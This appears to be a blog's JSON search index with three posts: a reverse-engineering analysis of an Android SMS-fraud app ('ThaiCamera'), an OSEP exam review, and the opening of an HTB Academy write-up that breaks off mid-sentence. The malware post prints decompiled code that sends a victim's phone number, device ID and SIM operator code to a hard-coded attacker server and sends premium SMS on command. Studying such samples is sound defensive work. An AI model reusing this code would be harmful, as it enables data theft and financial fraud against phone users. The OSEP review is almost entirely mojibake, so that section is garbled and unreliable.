{"meta":{"title":"Ikonw","subtitle":"","description":"","author":"Ikonw","url":"https://ik0nw.github.io","root":"/"},"pages":[{"title":"tags","date":"2023-12-11T06:32:46.161Z","updated":"2023-12-11T06:32:46.161Z","comments":true,"path":"tags/index.html","permalink":"https://ik0nw.github.io/tags/index.html","excerpt":"","text":""},{"title":"about","date":"2023-12-11T06:33:00.819Z","updated":"2023-12-11T06:33:00.819Z","comments":true,"path":"about/index.html","permalink":"https://ik0nw.github.io/about/index.html","excerpt":"","text":""},{"title":"{{title}}","date":"2023-11-29T13:15:20.395Z","updated":"2023-11-29T13:15:20.395Z","comments":true,"path":"template/writeup.html","permalink":"https://ik0nw.github.io/template/writeup.html","excerpt":"","text":""}],"posts":[{"title":"Android Malware RE- ThaiCamera","slug":"Android Malware RE - ThaiCamera","date":"2024-02-04T16:00:00.000Z","updated":"2024-02-05T15:23:41.056Z","comments":true,"path":"2024/02/05/Android Malware RE - ThaiCamera/","permalink":"https://ik0nw.github.io/2024/02/05/Android%20Malware%20RE%20-%20ThaiCamera/","excerpt":"PurposeThe target of this exercise is to reverse engineering the application to check if it has send SMS fruds activity.","text":"PurposeThe target of this exercise is to reverse engineering the application to check if it has send SMS fruds activity. StartFirstly, for effective Reverse engineering, we must not dive in and read the code line by lines. Since we are targeting if the application sends frud SMS, we should look for the Send SMS functions. Have some research we found that, SmsManager is the standard API provided by Android for sending SMS messages, it allows to send text messages without user interaction. SMS Manager API sendTextMessage() sendMultipartTextMessage() SendDataMessage() The thing caught my eye is the URL in the BootService It listen for broadcast receiver, and if the action of is equal to SENT_HUGE_SMS_ACTION it will actually load a intent of ACTION_START and send the broadcast. @Override // android.content.BroadcastReceiver public void onReceive(Context context, Intent intent) &#123; String action = intent.getAction(); if (&quot;SENT_HUGE_SMS_ACTION&quot;.equals(action)) &#123; switch (getResultCode()) &#123; case -1: BootService.this.sendmessageStatus(AppEventsConstants.EVENT_PARAM_VALUE_YES); Intent start_intent = new Intent(Loading.ACTION_START); context.sendBroadcast(start_intent); return; case 0: default: BootService.this.sendmessageStatus(AppEventsConstants.EVENT_PARAM_VALUE_NO); return; case 1: BootService.this.sendmessageStatus(&quot;2&quot;); return; case 2: BootService.this.sendmessageStatus(&quot;4&quot;); return; case 3: BootService.this.sendmessageStatus(&quot;5&quot;); return; case 4: BootService.this.sendmessageStatus(&quot;3&quot;); return; &#125; &#125; &#125;&#125; The above code also states about the sendmessageStatus appear in the same file. It gets the phone particular and send along with the SMS status with POST request to http://139.59.107.168:8088 private String getPhoneNumber() &#123; TelephonyManager mTelephonyMgr = (TelephonyManager) getSystemService(&quot;phone&quot;); return mTelephonyMgr.getLine1Number(); &#125; public void sendmessageStatus(String status) &#123; if (TextUtils.isEmpty(this.phone)) &#123; this.phone = getPhoneNumber(); &#125; String device = getDeviceId(); try &#123; String spec = &quot;http://139.59.107.168:8088/smspostback?phone=&quot; + this.phone + &quot;&amp;status=&quot; + status + &quot;&amp;diviceid=&quot; + device; URL url = new URL(spec); HttpURLConnection urlConnection = (HttpURLConnection) url.openConnection(); urlConnection.setRequestMethod(&quot;POST&quot;); urlConnection.setReadTimeout(5000); urlConnection.setConnectTimeout(5000); urlConnection.setDoOutput(true); urlConnection.setDoInput(true); if (urlConnection.getResponseCode() == 200) &#123; Log.e(GraphResponse.SUCCESS_KEY, GraphResponse.SUCCESS_KEY); &#125; else &#123; Log.e(&quot;error&quot;, &quot;error&quot;); &#125; &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125; private String getDeviceId() &#123; TelephonyManager TelephonyMgr = (TelephonyManager) getSystemService(&quot;phone&quot;); return TelephonyMgr.getDeviceId(); &#125;&#125; The intent &quot;SENT_HUGE_SMS_ACTION is very suspicious, we can have a search on the string. It appear in the .com.cp.camera.loading. The method name is called sendMessage. It initialized a bundle object. Bundle is a key-value store for passing data between Android components. it then map the key FirebaseAnalytics.Param.ITEM_NAME to string SEND_SMS next it created a new Intent called SENT_HUGE_SMS_ACTION and put the bundle as a parameter into the intent. Next it created a smsManager instance. PendingIntent sentintent = PendingIntent.getBroadcast(this, 0, itSend, 134217728); This is a static method call to PendingIntent.getBroadcast() which returns a PendingIntent that will perform a broadcast. The 4 parameter, this refer to the current context, 0 is a request code, its usually set to 0 because itâ€™s not used for broadcast PendingIntent, the third paramter itsend is obviously the intent to be broadcast which the action is SEND_HUGE_SMS_ACTION. Lastly, the last parameter control how the methods behave, in this case, 134217728 corresponds to the flag PendingIntent.FLAG_UPDATE_CURRENT which update the existing PendingIntent if it already exists, otherwise creates a new one. FLAG_UPDATE_CURRENT public void sendMessage(String mobile, String content) &#123; Bundle bundle = new Bundle(); bundle.putString(FirebaseAnalytics.Param.ITEM_NAME, &quot;SEND_SMS&quot;); this.mFirebaseAnalytics.logEvent(FirebaseAnalytics.Event.SELECT_CONTENT, bundle); Intent itSend = new Intent(&quot;SENT_HUGE_SMS_ACTION&quot;); itSend.putExtras(bundle); SmsManager sms = SmsManager.getDefault(); PendingIntent sentintent = PendingIntent.getBroadcast(this, 0, itSend, 134217728); try &#123; if (content.length() &gt; 70) &#123; List&lt;String&gt; msgs = sms.divideMessage(content); for (String msg : msgs) &#123; sms.sendTextMessage(mobile, null, msg, sentintent, null); &#125; return; &#125; sms.sendTextMessage(mobile, null, content, sentintent, null); &#125; catch (Exception e) &#123; SharedPreferences sharedPreferences = getSharedPreferences(&quot;videoLibrary&quot;, 0); SharedPreferences.Editor editor = sharedPreferences.edit(); editor.putString(&quot;videoShare&quot;, AppEventsConstants.EVENT_PARAM_VALUE_NO); editor.apply(); e.printStackTrace(); &#125;&#125; After that, I guess its checking the content length of the message, if the content length is more than 70, it actually call the method sms.divideMessage to divide the sms into multiple SMS. and Send one by one. The reason being SMS messages are limited to 70 character in UC-2 encoding. try &#123; if (content.length() &gt; 70) &#123; List&lt;String&gt; msgs = sms.divideMessage(content); for (String msg : msgs) &#123; sms.sendTextMessage(mobile, null, msg, sentintent, null); &#125; return; &#125; sms.sendTextMessage(mobile, null, content, sentintent, null); This is my first time encounter the sms.sendTextMessage public void sendTextMessage (String destinationAddress, String scAddress, String text, PendingIntent sentIntent, PendingIntent deliveryIntent) sms.sendTextMessage(mobile, null, msg, sentintent, null); destination Address - The address the message to; In this case is the mobile number scAddress - the Service center address or null to use the current default SMSC text - The body of the message sentIntent - the intent to handle the result of sending the message, such as whether it was successfully sent or not . Good now we know what sendMessage do (Actually can tell by the name, but for the sake of study). Next, we can look for which methods or class called this sendMessage. It appear in the same file public void onClick(View v) &#123; if (Build.VERSION.SDK_INT &lt; 23) &#123; if (Loading.this.service != null &amp;&amp; Loading.this.content != null) &#123; Loading.this.sendMessage(Loading.this.service, Loading.this.content); return; &#125; return; &#125; int checkCallPhonePermission = ContextCompat.checkSelfPermission(Loading.this.getApplicationContext(), &quot;android.permission.SEND_SMS&quot;); if (Loading.this.videoShare.equals(AppEventsConstants.EVENT_PARAM_VALUE_YES) &amp;&amp; checkCallPhonePermission == 0) &#123; if (Loading.this.service != null &amp;&amp; Loading.this.content != null) &#123; Loading.this.sendMessage(Loading.this.service, Loading.this.content); return; &#125; return; It firstly check if the version is less than 23, if less than 23, it will directly called the method Loading.this.sendMessage(Loading.this.service, Loading.this.content);. According to what we have analysis just now, the first parameter is the number, second parameter is the message body. The name seems funny, but its alright, will come back to this later, if the version is more than 23, it will check if the application have the permission of &quot;android.permission.SEND_SMS&quot; Android runtime permission The above link states that if the android SDK version is 23 (Android 6.0) and above it need to request for runtime permission. Ok back to the topic, the code below will check if run time permission is granted, and send the message. So now, what is this.service and this.content, this is our main focus, where the message is beings sent to and what is the content. protected void onCreate(Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); setContentView(R.layout.activity_mainfir); this.ms_show = (TextView) findViewById(R.id.ms_show); this.mReceiver = new StartActivityReceiver(); registerReceiver(this.mReceiver, new IntentFilter(ACTION_START)); TelephonyManager telManager = (TelephonyManager) getSystemService(&quot;phone&quot;); String operator = telManager.getSimOperator(); this.button_sensms = (Button) findViewById(R.id.button_sensms); if (Build.VERSION.SDK_INT &gt; 9) &#123; StrictMode.ThreadPolicy policy = new StrictMode.ThreadPolicy.Builder().permitAll().build(); StrictMode.setThreadPolicy(policy); &#125; Intent service_intent = new Intent(this, BootService.class); startService(service_intent); String jsonStr = loginByPost(operator); try &#123; JSONObject object = new JSONObject(jsonStr); this.content = object.getString(&quot;content&quot;); this.rule = object.getString(&quot;rule&quot;); this.service = object.getString(&quot;service&quot;); this.status = object.getString(&quot;code&quot;); this.button = object.getString(&quot;button&quot;); this.IMEIS = object.getString(&quot;imei&quot;); this.imeicontent = object.getString(&quot;imeicontent&quot;); &#125; catch (JSONException e) &#123; e.printStackTrace(); &#125; if (this.rule != null) &#123; this.ms_show.setText(this.rule); &#125; if (this.button != null) &#123; this.button_sensms.setText(this.button); &#125; if (operator != null &amp;&amp; this.imeicontent != null &amp;&amp; !this.imeicontent.equals(&quot;&quot;)) &#123; String[] imeicontents = this.imeicontent.split(&quot;,&quot;); int i = 0; while (true) &#123; if (i &gt;= imeicontents.length) &#123; break; &#125; String[] imei = imeicontents[i].split(&quot;:&quot;); if (!operator.equals(imei[0])) &#123; i++; &#125; else &#123; this.shareSend = 1; this.service = imei[1]; this.content = imei[2]; break; &#125; &#125; &#125; Above file is written onCreate method in the same file. this.service = object.getString(&quot;service&quot;); We can see that this.service is get through the object. JSONObject object = new JSONObject(jsonStr); The object is a JSON object by jsonStr String jsonStr = loginByPost(operator); The jsonStr comes from the function loginByPost with parameter operator. String operator = telManager.getSimOperator(); The operator is the value of telManager.getSimOperator() Very interesting, this getSimOpertor retrieves the MCC+MNC(Mobile Country Code + Mobile NetWork Code) of the active SIM card as a string. Letâ€™s have a example for Singapore, the MMC (Mobile Country Code) is 525, the MNC (Mobile Network Code) depends on the mobile network operator. Singtel MNC - 01 StarHub MNC - 05 M1 MNC - 03 So if we are using Singtel SIMCard, the value return will be 52501 Cool! Letâ€™s examine the loginByPost method. public String loginByPost(String code) &#123; String str = Build.VERSION.RELEASE; String str2 = Build.MODEL; getPhoneNumber(); getDeviceId(); try &#123; String spec = &quot;http://139.59.107.168:8088/appsharejson?code=&quot; + code; URL url = new URL(spec); HttpURLConnection urlConnection = (HttpURLConnection) url.openConnection(); urlConnection.setRequestMethod(&quot;POST&quot;); urlConnection.setReadTimeout(5000); urlConnection.setConnectTimeout(5000); urlConnection.setDoOutput(true); urlConnection.setDoInput(true); if (urlConnection.getResponseCode() == 200) &#123; InputStream is = urlConnection.getInputStream(); ByteArrayOutputStream baos = new ByteArrayOutputStream(); byte[] buffer = new byte[1024]; while (true) &#123; int len = is.read(buffer); if (len != -1) &#123; baos.write(buffer, 0, len); &#125; else &#123; is.close(); baos.close(); return new String(baos.toByteArray()); &#125; &#125; &#125; else &#123; return &quot;error&quot;; &#125; &#125; catch (Exception e) &#123; e.printStackTrace(); return &quot;error&quot;; &#125;&#125; It sends the MMC+MNC string to the target server with a POST request String spec = &quot;http://139.59.107.168:8088/appsharejson?code=&quot; + code;URL url = new URL(spec);HttpURLConnection urlConnection = (HttpURLConnection) url.openConnection();urlConnection.setRequestMethod(&quot;POST&quot;);urlConnection.setReadTimeout(5000);urlConnection.setConnectTimeout(5000);urlConnection.setDoOutput(true);urlConnection.setDoInput(true); Next, it check if the request status code is 200, then it read the response content into buffer and return it as a string. So we can safely conclude that the the the userâ€™s MNC+MMC is being sent to the target server, then the target server returns a json contains the follow values: this.content = object.getString(&quot;content&quot;);this.rule = object.getString(&quot;rule&quot;);this.service = object.getString(&quot;service&quot;);this.status = object.getString(&quot;code&quot;);this.button = object.getString(&quot;button&quot;);this.IMEIS = object.getString(&quot;imei&quot;);this.imeicontent = object.getString(&quot;imeicontent&quot;); Now, letâ€™s determine how the Send SMS frud is being triggered, we can search by the usage of the sendMessage method @Override // android.app.Activitypublic void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) &#123; super.onRequestPermissionsResult(requestCode, permissions, grantResults); if (requestCode == 1 &amp;&amp; grantResults[0] == 0) &#123; if (this.service != null &amp;&amp; this.content != null) &#123; sendMessage(this.service, this.content); return; &#125; return; &#125; Toast.makeText(this, &quot;Please allow accessï¼&quot;, 1).show();&#125; This piece of code is previously we are talking about the requesting the runtime permission, it requests for the runtime permission, as long as it gets the permission, it will actually call the sendMessage method. findViewById(R.id.button_sensms).setOnClickListener(new View.OnClickListener() &#123; // from class: com.cp.camera.Loading.1 @Override // android.view.View.OnClickListener public void onClick(View v) &#123; if (Build.VERSION.SDK_INT &lt; 23) &#123; if (Loading.this.service != null &amp;&amp; Loading.this.content != null) &#123; Loading.this.sendMessage(Loading.this.service, Loading.this.content); return; &#125; return; &#125;.................................. Coming back to this code, it actually is a onClick method, which requires user interaction. Looking at the findViewById(R.id.button_sensms seems the button to click. Follow up with the button_sensms It seems the text is based on the previous server response too. Weird. Alright anyway the full picture of this malware should be. When the application is started, it will send the victimâ€™s SIM Card details to the remote server, remote server may depends on the victim SIM Card details providing different set of numbers? (Maybe targeting different country) or texts. Then it request for user runtime permission to allow send SMS.","categories":[],"tags":[]},{"title":"OSEP REVIEW","slug":"osep_review","date":"2022-04-11T16:00:00.000Z","updated":"2023-11-30T10:28:54.440Z","comments":true,"path":"2022/04/12/osep_review/","permalink":"https://ik0nw.github.io/2022/04/12/osep_review/","excerpt":"","text":"æ¦‚æ‹¬ä¹‹å‰æ—§çš„OSCEå› ä¸ºå¤ªè¿‡è€æ—§åŠ ä¸Šæ–°çš„ OFFSEC CEOä¸Šå²—ï¼Œå°±æŠŠOSCEåˆ†å‡ºäº†æ–°çš„ä¸¤éƒ¨åˆ† + OSWE å½¢æˆäº†OSCE3çš„è¯ä¹¦ è€Œæ—§çš„OSCE ä¹Ÿå†2020å¹´10æœˆä¸‹æ¶äº†ã€‚ å½“ç„¶ä¸»è¦çš„æ˜¯æœ¬æ–‡ä¸­æåˆ°çš„OSEP (Offensive Security Experienced Penetration Tester) å±äº â€œè¿›é˜¶æ¸—é€â€ ï¼Œç›¸æ¯”OSCPï¼Œè¯¾ç¨‹çš„å‰åŠéƒ¨åˆ†æä¾›äº†é’“é±¼ï¼Œå…æ€ï¼ŒååŠéƒ¨åˆ†åˆ™æ˜¯å¯¹åŸŸçš„æ¨ªå‘ææƒã€‚ å…æ€çš„éƒ¨åˆ†åˆ™æ˜¯ç”¨äº†C#ï¼ŒVBAä»¥åŠPowershellã€‚è¿™æ—¶ä½ å°±ä¼šé—® å¦‚æœæˆ‘ä¸ä¼šC#å’ŒVBAï¼Œæˆ‘æ˜¯ä¸æ˜¯è¦å…ˆå»Bç«™çœ‹å‡ ä¸ªè§†é¢‘å†å»ä¹°è¯¾ï¼Ÿ ç­”æ¡ˆæ˜¯ä¸ç”¨çš„ï¼Œæˆ‘æœ€å–œæ¬¢è¯¾ç¨‹çš„ä¸€ç‚¹æ˜¯ä¼šæ…¢æ…¢çš„å¾ªç¯å¸¦è¿›ã€‚æœ¬äººæ²¡æœ‰ä¸€ä¸ç‚¹C#ä»¥åŠVBAæ–¹é¢çš„çŸ¥è¯†ï¼Œä½†è·Ÿç€è¯¾ç¨‹èµ°å®Œåã€‚å¯¹è¿™ä¸¤ä¸ªè¯­è¨€æˆ–å¤šæˆ–å°‘æœ‰ç‚¹äº†è§£ã€‚ å¯¹äºä»·é’±ä»¥åŠå…¶ä»–è¯¾ç¨‹çš„è¦æ±‚å¯ä»¥è‡ªè¡Œå‰å¾€å®˜ç½‘æŸ¥çœ‹ æˆ‘å°±ä¸ä¸€ä¸€ä»‹ç»äº†ã€‚ ä¸ªäººèƒŒæ™¯åœ¨å®˜ç½‘çš„Course Prerequisitesé‡Œæœ‰è¦æ±‚å¯¹åŸŸç¯å¢ƒå’Œæ”»å‡»æœ‰åŸºæœ¬çš„äº†è§£ã€‚ æˆ‘åœ¨2020å¹´åˆçš„æ—¶å€™è€ƒè¿‡äº†OSCPï¼Œé‚£æ—¶çš„èµ„æ–™å¯¹åŸŸç¯å¢ƒçš„æ¯”è¾ƒå°‘è€ƒè¯•ä¹Ÿæ²¡æœ‰è€ƒåŸŸç¯å¢ƒç±»çš„æ”»å‡»ã€‚ åœ¨æ¨æˆé¾™å¤§å“¥çš„æ¨èä¸‹ è´­ä¹°äº†CRTP(CERTIFIED RED TEAM PROFESSIONAL) è¿™è¯¾ç¨‹å¯¹é‚£äº›åŸŸçš„åˆå­¦è€…ååˆ†å‹å¥½ï¼Œä¹Ÿæ˜¯æ…¢æ…¢çš„ç†Ÿæ‚‰å„ç§å§¿åŠ¿ã€‚ ç„¶åæˆ‘çœ‹æˆ‘è‡ªå·±åº”è¯¥ç¬¦åˆè¯¾ç¨‹çš„è¦æ±‚äº†ï¼Œå°±æƒ³å»æ–°å®˜ç½‘é¢„çº¦ä¸‹è¯¾ç¨‹å¼€å§‹çš„æ—¶é—´ï¼Œæœ¬æ¥æƒ³é¢„çº¦ä¸¤å‘¨åçš„ç»“æœç»™æˆ‘å½“åœºå°±å¼€å§‹è¯¾ç¨‹äº†ã€‚ ä½†ç»“æœæ˜¯æ‰å¿ƒçš„ï¼Œè¿˜æ˜¯ç›´æ¥å¼€å§‹äº† 60å¤©OSEPçš„è¯¾ç¨‹å®éªŒå®¤åˆ†ä¸ºä¸¤éƒ¨åˆ†ï¼Œä¸€éƒ¨åˆ†æ˜¯ç»™ä½ ç»ƒä¹ PDFä¸Šé¢çš„å†…å®¹ï¼Œå¦å¤–ä¸€éƒ¨åˆ†ä¸ºChallenge labæ¨¡æ‹ŸçœŸå®çš„åŸŸç¯å¢ƒè®©ä½ ç»ƒä¹ å†PDFä¸Šé¢å­¦åˆ°çš„å†…å®¹ï¼Œå¹¶ä¸”æ˜¯æ²¡æœ‰ç­”æ¡ˆçš„ã€‚ ç”±äºæœ¬äººæ˜¯å†æ–°åŠ å¡æœå…µå½¹ï¼Œåªæœ‰æ™šä¸Šæ‰èƒ½ç¢°åˆ°è‡ªå·±çš„ç”µè„‘ï¼Œæ¯æ™šå¤§çº¦æœ‰4-5ä¸ªå°æ—¶çš„å­¦ä¹ æ—¶é—´ã€‚æœ‰æ—¶è¿˜ä¸€åˆ°å®¶å°±é©¬ä¸Šå€’å¤´å°±ç¡çš„æƒ…å†µã€‚ èŠ±äº†å¤§æ¦‚30å¤©å·¦å³çš„æ—¶é—´ï¼Œè¯»å®Œäº†PDFä»¥åŠç»ƒä¹ ï¼Œç„¶åç”¨å‰©ä¸‹çš„30å¤©æ¥æ‰“å®Œ6ä¸ªChallenge labã€‚ å½“æˆ‘åšå®ŒPDFç»ƒä¹ çš„æ—¶å€™æ¯”æˆ‘é¢„æƒ³çš„è¿˜è¦å¿«ï¼Œæˆ‘å°±é©¬ä¸Šå®šäº†ç¦»æˆ‘Labç»“æŸåä¸¤å‘¨çš„è€ƒè¯•æ—¶é—´ å¥½åƒæ˜¯21å¹´10æœˆ26æ—¥ã€‚ ä½†åæ¥å› ä¸ºå†10æœˆ15æ—¥å·¦å³ï¼Œå› ä¸ºæœ‰äººè²Œä¼¼å†ç½‘ä¸Šæ³„éœ²çš„è€ƒè¯•é¢˜ç›®ï¼Œå°±å…¨é¢å–æ¶ˆäº†å…¨éƒ¨è€ƒè¯•ã€‚ ç„¶åå½“æ—¶å› ä¸ºè‹±é›„è”ç›Ÿæ‰‹æ¸¸å›½æœå‡ºäº†ï¼Œå°±ä¸“å¿ƒæ‰“æ¸¸æˆå»äº†ï¼ˆç‹—å¤´ï¼‰â€¦â€¦ è€ƒè¯•OSCE3çš„è¯ä¹¦éƒ½æ˜¯48å°æ—¶è€ƒè¯•+24å°æ—¶æŠ¥å‘Šï¼Œå¹¶ä¸”æœ‰ç›‘è€ƒ éœ€è¦å…¨ç¨‹ä¿æŒæ‘„åƒå¤´å¼€å¯å’Œä¿æŒå¯¹æ¡Œé¢çš„å…±äº«ï¼ˆå…¨éƒ¨æ˜¾ç¤ºå±ï¼‰ éœ€è¦å»å•æ‰€ï¼Œç¦»å¼€ç”µè„‘å‰éƒ½éœ€è¦è·Ÿç›‘è€ƒæŠ¥å¤‡ã€‚ ç¬¬ä¸€æ¬¡è€ƒè¯•ç¬¬ä¸€æ¬¡è€ƒè¯•çš„æ—¶å€™ï¼Œå‰ä¸ªæ™šä¸Šç†¬äº†å¤œ æ²¡å’‹ç¡å¥½ï¼Œç„¶å10ç‚¹é’Ÿçš„è€ƒè¯•è®©æˆ‘çœ¼ç›å·®ç‚¹éƒ½çä¸å¼€ã€‚ åˆ°ä¸‹åˆ3ç‚¹çš„æ—¶å€™æ‰æ‹¿åˆ°ç¬¬ä¸€ä¸ªFlag,ç„¶åå°±å¤ªå›°è·Ÿç›‘è€ƒè¯´äº†å£°ç„¶åå»ç¡äº†ä¸ªåˆè§‰ã€‚ åœ¨åç»­çš„æ—¶é—´é‡Œæˆ‘åªæ‹¿åˆ°äº†3ä¸ªFlagï¼Œ ç¦»åŠæ ¼è¿˜å·®7ä¸ªï¼Œæƒ¨æ·¡æ”¶å°¾ã€‚ ç¬¬äºŒæ¬¡åœ¨å‡†å¤‡ç¬¬äºŒæ¬¡è€ƒè¯•æ—¶ï¼Œ æˆ‘å»äº†HackTheBox çš„å¹³å°è´­ä¹°äº†Offshoreçš„ä¸€ä¸ªåŸŸç¯å¢ƒçš„é¶æœºè‡ªå·±å¤šåŠ ç»ƒä¹ ã€‚ Offshoreè·ŸLabçš„å·®åˆ«å¯èƒ½å°±æ˜¯Offshoreå¤šäº†ä¸€äº›å…¶ä»–çš„å°ä¸œè¥¿ï¼Œæ¯”å¦‚Webæ”»å‡»ï¼Œææƒä»¥åŠæ²¡æœ‰ä»»ä½•çš„AVã€‚ Offshoreæœ‰21å°ä¸»æœºï¼Œæœ‰å››ä¸ªåŸŸè®©ä½ æ¨ªå‘ã€‚å…¶ä¸­å½“ç„¶ä¹Ÿå­¦åˆ°äº†ä¸€äº›æ–°çš„æ¨ªå‘æŠ€å·§ï¼Œä»¥åŠå®Œå–„è‡ªå·±å¯¹åŸŸç¯å¢ƒçš„enumerationå’Œæ›´å¤šçš„impacketèŠ±å¼ä½¿ç”¨æŠ€å·§ã€‚ å¯¹é‚£äº›åšå®ŒLabï¼Œå¹¶ä¸”è¿˜æ˜¯å¯¹è‡ªå·±æ²¡æœ‰ä»»ä½•ä¿¡å¿ƒçš„å¯ä»¥å°è¯•å»HTBè®¢é˜…ä¸‹è¿™ä¸ªåŸŸç¯å¢ƒï¼ˆå°±æ˜¯ä»·é’±ç¨è´µï¼‰ ç¬¬ä¸€ä¸ªæœˆæ˜¯70æ¬§å…ƒï¼ˆå¯åŠ¨è´¹ï¼‰+ 20æ¬§å…ƒ ï¼ˆè®¢é˜…è´¹ï¼‰ï¼Œåç»­çš„æ¯ä¸ªæœˆåªéœ€è¦20æ¬§å…ƒçš„è®¢é˜…è´¹å³å¯ã€‚ è€ƒè¯•çš„å‰ä¸€å¤©ä¹Ÿå»äº†Offsec Discord é¢‘é“çœ‹äº†ä¸€äº›å¤§ä½¬çš„è€ƒè¯•å»ºè®®ã€‚ ç„¶åå†è€ƒè¯•å½“å¤©ï¼Œè¿™æ¬¡å­¦èªæ˜äº†ï¼ŒæŠŠæ—¶é—´å®šåœ¨äº†12ç‚¹å¼€å§‹ã€‚ 12ç‚¹é’Ÿçš„æ—¶å€™ä¾‹è¡Œè·Ÿç›‘è€ƒæ£€æŸ¥èº«ä»½è¯ä¿¡æ¯å’Œè€ƒè¯•ç¯å¢ƒã€‚ æ•´ä¸ªè€ƒè¯•è¿‡ç¨‹æŒºæµç•…çš„ï¼Œåœ¨å½“å¤©æ™šä¸Š23ç‚¹çš„æ—¶å€™å·²ç»æ‹¿åˆ°7ä¸ªFlag å¹¶ä¸”å¯¹ä¸‹ä¸ªFlagæœ‰äº›çœ‰ç›®äº†ã€‚ ç¬¬äºŒå¤© 8ç‚¹èµ·åºŠ ç„¶ååƒæ—©é¤æ¶ˆåŒ–ï¼Œ10ç‚¹ç»§ç»­è€ƒè¯•ï¼Œå¾ˆé¡ºåˆ©çš„åœ¨åŠå°æ—¶å†…å¯¹æ˜¨æ™šçš„å‘½ä»¤åšäº†äº›è°ƒæ•´æˆåŠŸæ‹¿ä¸‹ç¬¬å…«ä¸ªFlagã€‚ 12ç‚¹çš„æ—¶å€™æˆåŠŸæ‹¿ä¸‹ç¬¬9ä¸ªFlagï¼Œåœ¨æ¥ä¸‹æ¥çš„å…­ä¸ªå°æ—¶é‡Œï¼Œæ²¡æœ‰ä»»ä½•æ”¶è·ã€‚å¿ƒæƒ…å¼€å§‹é€æ¸ç„¦è™‘ï¼Œäºæ˜¯å°±å»æ´—äº†ä¸ªæ¾¡åƒäº†æ™šé¤ï¼Œé™ªäº†ä¸‹ä¾„å­ã€‚ ç„¶åå›åˆ°è€ƒè¯•å†…åŠå°æ—¶å°±é¡ºåˆ©æ‰¾åˆ°ç¬¬åä¸ªFlagï¼Œæ‹¿åˆ°äº†åŠæ ¼åˆ†æ•°ã€‚ ç„¶åå¼€å§‹çš„é™ªæœ‹å‹â€œä¼‘é—²â€äº†ä¼šå„¿ã€‚ åœ¨å‡Œæ™¨å¼€å§‹å†™æŠ¥å‘Šï¼Œå†™äº†äº”ä¸ªå°æ—¶ æŠŠå…¨éƒ¨çš„æˆªå›¾ä»¥åŠæ­¥éª¤è¯¦ç»†å†™äº†ï¼Œæäº¤å®Œå°±ç„¶åæ˜æ˜æ¬²ç¡äº†ã€‚ å¾ˆé¡ºåˆ©åœ°åœ¨éš”å¤©çš„Offsec Portalå‘ç°è‡ªå·±åŠæ ¼äº†è€ƒè¯• FAQ1. æˆ‘æ²¡æœ‰OSCPå¯ä»¥ç›´æ¥æŠ¥åOSEPå˜›ï¼Ÿ ç­”æ¡ˆï¼šæ˜¯å¯ä»¥çš„ï¼ŒOSEPæ²¡æœ‰ä»»ä½•å‰ç½®è¦æ±‚ï¼Œä½†æœ¬äººè¿˜æ˜¯æ¨èæœ‰OSCPçš„ç»éªŒå†è€ƒ æœ‰æ›´å¤§çš„å‡ ç‡é€šè¿‡è€ƒè¯• 2. è¯¾ç¨‹é‡Œå¥½åƒæœ‰å¾ˆå¤šC#ç¼–ç¨‹å’Œå…æ€éƒ¨åˆ†çš„çŸ¥è¯†ï¼Œæˆ‘ä¸ä¼šæ€ä¹ˆåŠï¼Ÿ ç­”æ¡ˆï¼šè¯¾ç¨‹ä¼šå¸¦ä½ ä»0åˆ°1ï¼Œæ…¢æ…¢ä¸€æ­¥ä¸€æ­¥æ•™ã€‚ 3. è¯¾ç¨‹ç²¾åçš„éƒ¨åˆ†æ˜¯åœ¨å“ªé‡Œï¼Ÿ ç­”æ¡ˆï¼šæˆ‘ä¸ªäººè§‰å¾—æ•´ä¸ªè¯¾ç¨‹æœ€ç²¾åå°±æ˜¯C#å…æ€ç¼–ç¨‹é‡Œã€‚ 4. è¯¾ç¨‹æ•™çš„å…æ€æŠ€å·§å’Œæ–¹å¼èƒ½è¿‡æœ€æ–°çš„Windows Defenderå˜›ï¼Ÿ ç­”æ¡ˆï¼šä¸èƒ½ï¼Œä½†åœ¨avæ‰«æçš„ç½‘ç«™è¿˜æ˜¯åªæœ‰æå°‘æ•°å¯ä»¥ä¾¦å¯Ÿåˆ°ï¼Œæœ€é‡è¦çš„æ˜¯æ•™ä½ çš„è¿™ä¸ªæ€è·¯ï¼Œè¿™ä¸ªPEN-300ç»™äº†ä½ è¿™ä¸ªç‰¢å›ºçš„åœ°ç –ï¼Œä½ å¯ä»¥åœ¨ä¸Šé¢çš„ä»£ç åšå‡ºä¿®æ”¹ã€‚æŒºå¤šDiscordçš„äººéƒ½é€šè¿‡è¯¾ç¨‹æ•™çš„ç„¶åè‡ªå·±ä¿®æ”¹èƒ½è¾¾åˆ° VirusTotal 0ä¸ªä¾¦å¯Ÿã€‚ 5. Pdfå’ŒChallenge labæ—¶é—´åº”è¯¥å¦‚ä½•åˆ†é…å‘¢ï¼Ÿ ç­”æ¡ˆï¼š ä¸ªäººå»ºè®®æ˜¯å¤šèŠ±æ—¶é—´åœ¨Challenge Labã€‚","categories":[],"tags":[{"name":"offsec","slug":"offsec","permalink":"https://ik0nw.github.io/tags/offsec/"}]},{"title":"HTB Academy Writeup","slug":"HTB-Academy","date":"2020-11-12T16:00:00.000Z","updated":"2023-11-30T10:29:10.879Z","comments":true,"path":"2020/11/13/HTB-Academy/","permalink":"https://ik0nw.github.io/2020/11/13/HTB-Academy/","excerpt":"","text":"NmapMaking a script scan on all ports Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-08 11:27 +08 Nmap scan report for 10.129.20.117Host is up (0.27s latency).PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)80/tcp open http Apache httpd 2.4.41 ((Ubuntu))|_http-server-header: Apache/2.4.41 (Ubuntu)|_http-title: Did not follow redirect to http://academy.htb/33060/tcp open mysqlx?1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :SF-Port33060-TCP:V=7.80%I=7%D=11/8%Time=5FA765A9%P=x86_64-pc-linux-gnu%r(GSF:enericLines,9,&quot;\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0&quot;);Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 183.87 seconds As Usual, add the hostname to /etc/hosts Visit the academy.htb site, only a background nothing clickable. Right click look at the souce, found the login and register site. Trying to attemp with default admin creds. No errors been show, guess it is either not responsive or the error message is hidden. Always use burp when 